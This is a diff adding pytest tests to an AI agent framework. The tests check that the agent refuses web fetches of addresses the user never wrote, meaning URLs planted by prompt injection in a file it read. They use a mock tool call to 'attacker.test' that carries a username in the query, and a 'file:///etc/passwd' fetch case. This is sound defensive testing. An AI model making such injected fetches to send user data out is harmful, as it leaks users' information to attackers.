@@ -315,6 +315,57 @@ async def test_file_write_without_file_intent_is_refused() -> None:
 
 
 @pytest.mark.asyncio
+async def test_fetch_of_an_address_the_user_never_wrote_is_refused() -> None:
+    """A URL planted in a file the model read is not fetched (prompt injection)."""
+    kernel, router, registry = _make_kernel()
+    router.complete.side_effect = [
+        _mock_model_response('["Summarize the file"]'),
+        _mock_tool_call_response("web_fetch", {"url": "https://attacker.test/notes?u=Sam"}),
+        _mock_model_response('{"progress": true}'),  # reflector: the refused fetch
+        _mock_model_response("Here is the summary."),
+    ]
+
+    state = await kernel.run("Summarize release-notes.md")
+
+    registry.execute.assert_not_awaited()
+    assert "Not fetched" in [m for m in state.messages if m.role == "tool"][0].content
+    assert state.final_answer == "Here is the summary."
+
+
+@pytest.mark.asyncio
+async def test_fetch_of_an_address_the_user_wrote_runs() -> None:
+    """A page the user named is fetched, whatever scheme or trailing slash the model adds."""
+    kernel, router, registry = _make_kernel()
+    router.complete.side_effect = [
+        _mock_model_response('["Fetch the page"]'),
+        _mock_tool_call_response("web_fetch", {"url": "https://www.example.com/"}),
+        _mock_model_response('{"progress": true}'),
+        _mock_model_response("The page is a placeholder for examples."),
+    ]
+
+    await kernel.run("Fetch example.com and tell me what it says")
+
+    registry.execute.assert_awaited_once_with("web_fetch", url="https://www.example.com/")
+
+
+def test_fetch_provenance_compares_path_and_query_exactly() -> None:
+    """Only addresses the user wrote may be fetched; data can't ride in a new path or query."""
+    from cortex.agent.executor import _is_unrequested_fetch
+
+    def refused(url: str, *user_texts: str) -> bool:
+        return _is_unrequested_fetch("web_fetch", {"url": url}, list(user_texts))
+
+    assert not refused("http://example.com", "Read https://example.com.")
+    assert not refused("https://example.com/a?b=1", "Fetch https://example.com/a?b=1", "Again")
+    assert refused("https://example.com/a?b=2", "Fetch https://example.com/a?b=1")
+    assert refused("https://example.com/Sam", "Fetch https://example.com")
+    assert refused("https://attacker.test/c", "Summarize release-notes.md")
+    # No host: web_fetch itself rejects these with a specific error.
+    assert not refused("file:///etc/passwd", "Fetch file:///etc/passwd")
+    assert not _is_unrequested_fetch("filesystem", {"path": "notes.md"}, ["Read notes.md"])
+
+
+@pytest.mark.asyncio
 async def test_file_write_with_file_intent_runs() -> None:
     """An explicit request to save a file still writes it."""
     kernel, router, registry = _make_kernel()
@@ -975,6 +1026,22 @@ def test_explicit_save_request_plans_a_filesystem_write() -> None:
     assert saved == ["Write the requested file with the filesystem tool"]
     reading = ["Answer directly: write the complete code"]
     assert _ensure_file_save_step(reading, "Write Python code that reads data.csv") == reading
+
+
+def test_file_name_passed_as_content_on_a_read_becomes_the_path() -> None:
+    """{"action": "read_file", "content": "notes.md"} (a small-model slip) still reads the file."""
+    from cortex.agent.executor import _repaired_args
+
+    slip = {"action": "read_file", "content": "release-notes.md"}
+    assert _repaired_args("filesystem", slip) == {"action": "read_file", "path": "release-notes.md"}
+    # A write's content is data, never a path; nor is multi-line text or a call with a path.
+    write = {"action": "write_file", "content": "notes.md"}
+    assert _repaired_args("filesystem", write) == write
+    lines = {"action": "read_file", "content": "one\ntwo"}
+    assert _repaired_args("filesystem", lines) == lines
+    both = {"action": "read_file", "path": "a.md", "content": "b.md"}
+    assert _repaired_args("filesystem", both) == both
+    assert _repaired_args("python_exec", {"content": "x"}) == {"content": "x"}
 
 
 def test_quoted_text_is_not_an_instruction() -> None:
